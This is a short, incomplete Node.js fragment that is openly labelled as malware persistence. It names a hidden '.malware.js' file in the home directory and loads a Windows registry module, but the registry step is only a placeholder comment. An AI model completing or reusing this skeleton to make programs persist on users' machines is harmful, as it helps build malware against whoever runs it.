// Persistence
const fs = require('fs');
const os = require('os');
const path = os.homedir() + '/.malware.js';

// Startup
if (process.platform === 'win32') {
    const reg = require('winreg');
    // Would add to registry
}
